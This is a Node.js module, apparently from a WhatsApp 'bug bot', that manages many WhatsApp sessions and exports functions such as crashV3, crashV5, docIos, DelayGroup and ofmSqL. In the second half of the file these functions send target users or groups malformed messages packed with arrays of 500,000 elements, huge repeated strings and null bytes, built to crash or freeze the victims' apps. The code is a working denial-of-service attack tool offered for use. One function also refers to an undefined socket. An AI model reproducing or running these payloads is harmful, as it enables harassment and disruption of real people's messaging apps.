const fs = require('fs');
const path = require('path');
const { 
    makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    generateWAMessageFromContent, 
    prepareWAMessageMedia, 
    proto, 
    jidEncode, 
    jidDecode, // Perbaikan: huruf kecil
    encodeWAMessage, 
    encodeSignedDeviceIdentity 
} = require("@zeppeliorg/wbails");
const pino = require('pino');
const P = require('pino');
const { logger } = require('../utils/logger');
// Pastikan path databaseService sesuai dengan struktur folder Anda
// const { loadKeyList, saveKeyList } = require('./databaseService'); 
const { safeStringify } = require('../utils/serialize_helper');
const crypto = require('crypto');

// Global State
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

// ==========================================
// HELPER FUNCTIONS
// ==========================================

// Cek Role (Termasuk High Owner)
function isVipOrOwner(user) {
  return user && ["vip", "dev"].includes(user.role);
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


const processedMessages = new Map();
const connectionAttempts = new Map();

function getVipSessionPath(sessionName) {
  const vipPath = path.join('vip_sessions', sessionName);
  if (!fs.existsSync(vipPath)) {
    fs.mkdirSync(vipPath, { recursive: true });
  }
  return vipPath;
}

function prepareVipSessionFolders() {
  const vipDir = 'vip_sessions';
  if (!fs.existsSync(vipDir)) {
    fs.mkdirSync(vipDir, { recursive: true });
    return [];
  }
  
  const files = fs.readdirSync(vipDir).filter(file => file.endsWith('.json'));
  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionPath = path.join(vipDir, baseName);
    if (!fs.existsSync(sessionPath)) {
      fs.mkdirSync(sessionPath, { recursive: true });
    }
    const source = path.join(vipDir, file);
    const dest = path.join(sessionPath, 'creds.json');
    if (!fs.existsSync(dest)) {
      fs.copyFileSync(source, dest);
    }
  }
  return files;
}

async function connectVipSession(sessionName, retries = 100) {
  // Cegah multiple connection untuk session yang sama
  if (activeConnections[sessionName]?.user) {
    logger.warn(`[VIP ${sessionName}] Session already connected, skipping duplicate`);
    return Promise.resolve();
  }
  
  // Cegah multiple attempt bersamaan
  if (connectionAttempts.get(sessionName)) {
    logger.warn(`[VIP ${sessionName}] Connection attempt already in progress`);
    return Promise.resolve();
  }
  
  connectionAttempts.set(sessionName, true);
  
  return new Promise(async (resolve) => {
    let isResolved = false;
    
    try {
      const sessionPath = getVipSessionPath(sessionName);
      const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        defaultQueryTimeoutMs: undefined,
      });

      // Hapus listener lama untuk mencegah duplikasi
      sock.ev.removeAllListeners("creds.update");
      sock.ev.removeAllListeners("connection.update");
      
      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          if (!isResolved) {
            activeConnections[sessionName] = sock;
            logger.info(`[VIP ${sessionName}] Terhubung sebagai: ${sock.user?.id || 'Unknown'}`);

            const type = detectWATypeFromCreds(`${sessionPath}/creds.json`);
            if (type === "Business") {
              biz[sessionName] = sock;
            } else if (type === "Messenger") {
              mess[sessionName] = sock;
            }
            
            isResolved = true;
            connectionAttempts.delete(sessionName);
            resolve();
          }
        } else if (connection === "close") {
          logger.warn(`[VIP ${sessionName}] Koneksi ditutup. Status: ${statusCode}`);

          if (statusCode === 440) {
            logger.error(`[VIP ${sessionName}] Session Invalid/Overwrite.`);
            delete activeConnections[sessionName];
            delete biz[sessionName];
            delete mess[sessionName];
          } else if (!isLoggedOut && retries > 0 && !isResolved) {
            await sleep(3000);
            connectionAttempts.delete(sessionName);
            if (!isResolved) {
              resolve(await connectVipSession(sessionName, retries - 1));
            }
          } else {
            logger.error(`[VIP ${sessionName}] Logout atau maksimal percobaan tercapai.`);
            delete activeConnections[sessionName];
            delete biz[sessionName];
            delete mess[sessionName];
            connectionAttempts.delete(sessionName);
            if (!isResolved) resolve();
          }
        }
      });
    } catch (err) {
      logger.error(`[VIP ${sessionName}] Gagal memuat: ${err.message}`);
      connectionAttempts.delete(sessionName);
      if (!isResolved) resolve();
    }
  });
}

async function startVipSessions() {
  const files = prepareVipSessionFolders();
  if (files.length === 0) return;

  logger.info(`[VIP] Memulai ${files.length} session VIP/Owner...`);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    if (activeConnections[baseName]) continue;
    await connectVipSession(baseName);
  }
}

function getActiveVipConnections() {
  const vipConnections = {};
  for (const sessionName in activeConnections) {
    if (fs.existsSync(getVipSessionPath(sessionName))) {
      vipConnections[sessionName] = activeConnections[sessionName];
    }
  }
  return vipConnections;
}

function isVipSession(sessionName) {
  return fs.existsSync(getVipSessionPath(sessionName));
}

function getRandomVipConnection() {
  const vipConnections = getActiveVipConnections();
  const sessionNames = Object.keys(vipConnections);
  if (sessionNames.length === 0) return null;
  const randomSession = sessionNames[Math.floor(Math.random() * sessionNames.length)];
  return vipConnections[randomSession];
}

// ==========================================
// SESSION MANAGEMENT: REGULAR (MEMBER)
// ==========================================

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      logger.info("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }
    return files;
  } catch (err) {
    logger.error("Error prepareAuthFolders: " + err.message);
    return [];
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';
  try {
    const creds = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';
    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  // Cegah multiple connection
  if (activeConnections[sessionName]?.user) {
    logger.warn(`[${sessionName}] Session already connected, skipping duplicate`);
    return Promise.resolve();
  }
  
  // Cegah multiple attempt bersamaan
  if (connectionAttempts.get(`member_${sessionName}`)) {
    logger.warn(`[${sessionName}] Connection attempt already in progress`);
    return Promise.resolve();
  }
  
  connectionAttempts.set(`member_${sessionName}`, true);
  
  return new Promise(async (resolve) => {
    let isResolved = false;
    
    try {
      const sessionsFold = path.join(folderPath, sessionName);
      
      // Pastikan folder exist
      if (!fs.existsSync(sessionsFold)) {
        fs.mkdirSync(sessionsFold, { recursive: true });
      }
      
      const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        defaultQueryTimeoutMs: undefined,
      });

      // Hapus listener lama
      sock.ev.removeAllListeners("creds.update");
      sock.ev.removeAllListeners("connection.update");
      
      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          if (!isResolved) {
            activeConnections[sessionName] = sock;

            const type = detectWATypeFromCreds(path.join(sessionsFold, 'creds.json'));
            logger.info(`[${sessionName}] Connected as: ${sock.user?.id || 'Unknown'}. Type: ${type}`);

            if (type === "Business") {
              biz[sessionName] = sock;
            } else if (type === "Messenger") {
              mess[sessionName] = sock;
            }
            
            isResolved = true;
            connectionAttempts.delete(`member_${sessionName}`);
            resolve();
          }
        } else if (connection === "close") {
          logger.info(`[${sessionName}] Connection closed. Status: ${statusCode}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            delete biz[sessionName];
            delete mess[sessionName];
            if (fs.existsSync(sessionsFold)) {
              fs.rmSync(sessionsFold, { recursive: true, force: true });
            }
          } else if (!isLoggedOut && retries > 0 && !isResolved) {
            await sleep(3000);
            connectionAttempts.delete(`member_${sessionName}`);
            if (!isResolved) {
              resolve(await connectSession(folderPath, sessionName, retries - 1));
            }
          } else {
            logger.info(`[${sessionName}] Logged out.`);
            delete activeConnections[sessionName];
            delete biz[sessionName];
            delete mess[sessionName];
            if (fs.existsSync(sessionsFold)) {
              fs.rmSync(sessionsFold, { recursive: true, force: true });
            }
            connectionAttempts.delete(`member_${sessionName}`);
            if (!isResolved) resolve();
          }
        }
      });
    } catch (err) {
      logger.error(`[${sessionName}] Error: ${err.message}`);
      connectionAttempts.delete(`member_${sessionName}`);
      if (!isResolved) resolve();
    }
  });
}

function checkActiveSessionInFolder(subfolderName, isVipOrOwnerUser = false) {
  // 1. Prioritas VIP
  if (isVipOrOwnerUser) {
    const vipConnections = getActiveVipConnections();
    const sessionNames = Object.keys(vipConnections);
    
    if (sessionNames.length > 0) {
      const randomSession = sessionNames[Math.floor(Math.random() * sessionNames.length)];
      return vipConnections[randomSession];
    }
  }
  
  // 2. Fallback ke session biasa
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName];
    }
  }
  return null;
}

async function startUserSessions() {
  try {
    // Start VIP Sessions First
    await startVipSessions();

    // Start Member Sessions
    if (!fs.existsSync('permenmd')) {
      fs.mkdirSync('permenmd', { recursive: true });
    }

    const subfolders = fs.readdirSync('permenmd')
      .map(name => path.join('permenmd', name))
      .filter(p => fs.existsSync(p) && fs.statSync(p).isDirectory());

    logger.info(`[DEBUG] Ditemukan ${subfolders.length} subfolder member di 'permenmd'`);

    const connectionPromises = [];
    
    for (const folder of subfolders) {
      if (!fs.existsSync(folder)) continue;
      
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      for (const jsonFile of jsonFiles) {
        const sessionName = path.basename(jsonFile, ".json");

        if (activeConnections[sessionName]) {
          continue;
        }

        // Jalankan parallel dengan Promise.all
        connectionPromises.push(
          connectSession(folder, sessionName).catch(err => {
            logger.error(`Gagal start session member ${sessionName}: ${err.message}`);
          })
        );
      }
    }
    
    // Tunggu semua session connect (dengan timeout)
    await Promise.allSettled(connectionPromises);
    logger.info(`Total active connections: ${Object.keys(activeConnections).length}`);
    
  } catch (err) {
    logger.error("Fatal error in startUserSessions: " + err.message);
  }
}

async function disconnectAllActiveConnections() {
  const disconnectPromises = [];
  
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    disconnectPromises.push(
      (async () => {
        try {
          if (sock && sock.ws && sock.ws.close) {
            sock.ws.close();
          }
          if (sock && sock.end) {
            await sock.end();
          }
          logger.info(`[${sessionName}] Disconnected.`);
        } catch (e) {
          logger.error(`[${sessionName}] Gagal disconnect: ${e.message}`);
        }
        delete activeConnections[sessionName];
        delete biz[sessionName];
        delete mess[sessionName];
      })()
    );
  }
  
  await Promise.allSettled(disconnectPromises);
  logger.info('? Semua sesi berhasil disconnect.');
  
  // Clear processed messages cache
  processedMessages.clear();
  connectionAttempts.clear();
}

// ==========================================
// MESSAGE HANDLER UNTUK CEGAH DUPLIKAT
// ==========================================

function setupMessageHandler(sock, sessionName) {
  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    // Cegah pesan duplikat
    for (const message of messages) {
      const messageId = message.key?.id;
      const messageTimestamp = message.messageTimestamp;
      
      // Buat unique key berdasarkan session, chat, dan message ID
      const uniqueKey = `${sessionName}_${message.key?.remoteJid}_${messageId}`;
      
      if (processedMessages.has(uniqueKey)) {
        logger.info(`[${sessionName}] Duplicate message detected: ${messageId}, skipping`);
        return;
      }
      
      // Simpan ke cache
      processedMessages.set(uniqueKey, Date.now());
      
      // Hapus setelah 10 detik
      setTimeout(() => {
        processedMessages.delete(uniqueKey);
      }, 10000);
      
      // Proses pesan di sini
      logger.info(`[${sessionName}] Processing message: ${messageId}`);
      
      // ... rest of message processing logic ...
    }
  });
}

// ==========================================
// EXPORTS
// ==========================================


async function ofmSqLKi(sock, target) {
    await sock.relayMessage("status@broadcast", {
        interactiveResponseMessage: {
            body: {
                text: "NULL NULL NULL",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "",
                version: 3
            },
            contextInfo: {
                remoteJid: Math.random().toString(36) + " ?! ",
                isForwarded: true,
                forwardingScore: 999,
                urlTrackingMap: {
                    urlTrackingMapElements: Array.from({ length: 500000 }, () => ({
                        "\u0000": "?"
                    }))
                }
            }
        }
    }, {
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: { status_setting: "contacts" },
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: []
                            }
                        ]
                    }
                ]
            }
        ]
    });
}

async function ofmSqLL(sock, target) {
  await sock.relayMessage("status@broadcast", {
    botInvokeMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          deviceListMetadata: {
            senderKeyIndex: 0,
            senderTimestamp: Date.now(),
            recipientKeyIndex: 0
          },
          deviceListMetadataVersion: 2
        },
        interactiveResponseMessage: {
          contextInfo: {
            remoteJid: "\0",
            fromMe: true,
            forwardedAiBotMessageInfo: {
              botJid: "13135550202@bot",
              botName: "Business Assistant",
              creator: "XzC - Expos3d"
            },
            statusAttributionType: 2,
            urlTrackingMap: {
              urlTrackingMapElements: Array.from({ length: 500000 }, () => ({
                type: 1
              }))
            },
            participant: sock.user.id
          },
          body: {
            text: "Xx",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "{ X: { status:true } }",
            version: 3
          }
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: { status_setting: "contacts" },
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: []
        }]
      }]
    }]
  });
}

async function ofmSqLi(sock, target) {
    await sock.relayMessage("status@broadcast", {
        interactiveResponseMessage: {
            body: {
                text: "@",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "",
                version: 3
            },
            contextInfo: {
                remoteJid: Math.random().toString(36) + " ?! ",
                isForwarded: true,
                forwardingScore: 999,
                urlTrackingMap: {
                    urlTrackingMapElements: Array.from({ length: 500000 }, () => ({
                        "\u0000": "?"
                    }))
                }
            }
        }
    }, {
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: { status_setting: "contacts" },
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: []
                            }
                        ]
                    }
                ]
            }
        ]
    });
}

async function ofmSqL(sock, target) {
  await sock.relayMessage("status@broadcast", {
    botInvokeMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          deviceListMetadata: {
            senderKeyIndex: 0,
            senderTimestamp: Date.now(),
            recipientKeyIndex: 0
          },
          deviceListMetadataVersion: 2
        },
        interactiveResponseMessage: {
          contextInfo: {
            remoteJid: "\0",
            fromMe: true,
            forwardedAiBotMessageInfo: {
              botJid: "13135550202@bot",
              botName: "Business Assistant",
              creator: "XzC - Expos3d"
            },
            statusAttributionType: 2,
            urlTrackingMap: {
              urlTrackingMapElements: Array.from({ length: 209000 }, () => ({
                type: 1
              })),
            },
            participant: sock.user.id
          },
          body: {
            text: "7eppeli.pdf",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "{ X: { status:true } }",
            version: 3
          }
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: { status_setting: "contacts" },
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: []
        }]
      }]
    }]
  })
}

async function docIos(sock, target) {
  try {
    const Node = "????";

    const metaNode = [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }];

    const locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + Node.repeat(15000),
      address: "\u0000" + Node.repeat(10000),
      url: `${Node.repeat(25000)}.com`
    };

    const extendMsg = {
      extendedTextMessage: {
        text: "X",
        matchedText: "",
        description: Node.repeat(25000),
        title: Node.repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/OLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 64,
        thumbnailWidth: 60,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };

    const makeMsg = content =>
      generateWAMessageFromContent(
        target,
        { viewOnceMessage: { message: content } },
        {}
      );

    const msg1 = makeMsg({ locationMessage });
    const msg2 = makeMsg(extendMsg);
    const msg3 = makeMsg({ locationMessage });

    for (const m of [msg1, msg2, msg3]) {
      await sock.relayMessage(
        "status@broadcast",
        m.message,
        {
          messageId: m.key.id,
          statusJidList: [target],
          additionalNodes: metaNode
        }
      );
    }

  } catch (e) {
    console.error(e);
  }
}
async function MentionedJid(sock, target) {
  const MentionedJidMsg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "Gw Rizz Bang?",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "",
              },
            },
          },
          body: {
            text: " " + "?".repeat(100000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "??".repeat(10000),
                  id: null
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "??".repeat(10000),
                  id: null
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "??".repeat(10000),
                  url: "https://" + "??".repeat(10000) + ".com"
                })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "??".repeat(10000),
                  copy_code: "??".repeat(10000)
                })
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "PROMOTION",
                  flow_cta: "PAYMENT_PROMOTION",
                  flow_message_version: "3"
                })
              }
            ],
          },
        },
      },
    },
  };
  await sock.relayMessage(target, MentionedJidMsg, {
    messageId: sock.generateMessageTag(),
    participant: { jid: target }
  });
  await sock.relayMessage(
    "status@broadcast",
    MentionedJidMsg,
    {
      messageId: sock.generateMessageTag(),
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target } }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function BlankMention(sock, target) {
  const MentionedJidMsg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "Gw Rizz Bang?",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "",
              },
            },
          },
          body: {
            text: " " + "?".repeat(100000),
          },
          nativeFlowMessage: {
            buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "??".repeat(10000),
                    id: null
                  })
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "??".repeat(10000),
                    id: null
                  })
                },
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "??".repeat(10000),
                    url: "https://" + "??".repeat(10000) + ".com"
                  })
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "??".repeat(10000),
                    copy_code: "??".repeat(10000)
                  })
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "PROMOTION",
                    flow_cta: "PAYMENT_PROMOTION",
                    flow_message_version: "3"
                 })
               }
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, MentionedJidMsg, {
    messageId: sock.generateMessageTag(),
    participant: { jid: target }
  });
} 

async function DelayGroup(sock, target) {
    if (!target.includes("@g.us")) {     
        return;
    }
    const jid = target;
    await sock.relayMessage(jid, {
        interactiveResponseMessage: {
            body: {
                text: "NULL NULL NULL",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "",
                version: 3
            },
            contextInfo: {
                remoteJid: Math.random().toString(36) + " ?! ",
                isForwarded: true,
                forwardingScore: 999,
                participant: target,
                urlTrackingMap: {
                    urlTrackingMapElements: Array.from({ length: 500000 }, () => ({
                        "\u0000": "?"
                    }))
                }
            }
        }
    }, {});
}

async function crashV3(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "XX"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });
}

async function gsJsonInvz(target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: " Assalamualaikum "
      },
      nativeFlowMessage: {
        buttons: "\0".repeat(500000)
      }
    }
  }, { participant: { jid: target } })
}

async function crashV5(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "XX"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });
  
  await sock.relayMessage("status@broadcast", {
    interactiveResponseMessage: {
      body: {
        text: "Click Here",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "call_permission_request",
        paramsJson: "FORM_SCREEN",
        version: 3
      },
      contextInfo: {
        remoteJid: Math.random().toString(36) + "CALL_ACCESS",
        isForwarded: true,
        forwardingScore: 999,
        urlTrackingMap: {
          urlTrackingMapElements: Array.from({ length: 500000 }, () => ({
            "\u0000": "Grettles"
          }))
        }
      }
    }
  }, {
    participant: { jid: target },
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: { status_setting: "contacts" },
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: []
              }
            ]
          }
        ]
      }
    ]
  });
}

module.exports = {
  activeConnections,
  biz,
  mess,
  prepareAuthFolders,
  detectWATypeFromCreds,
  connectSession,
  startUserSessions,
  disconnectAllActiveConnections,
  sleep,
  isVipOrOwner,
  getVipSessionPath,
  prepareVipSessionFolders,
  connectVipSession,
  startVipSessions,
  getActiveVipConnections,
  isVipSession,
  getRandomVipConnection,
  checkActiveSessionInFolder,
    ofmSqL,
    ofmSqLL,
  ofmSqLi,
  ofmSqLKi,
  docIos,
  MentionedJid,
  BlankMention,
  crashV3,
  gsJsonInvz,
  crashV5,
  DelayGroup
};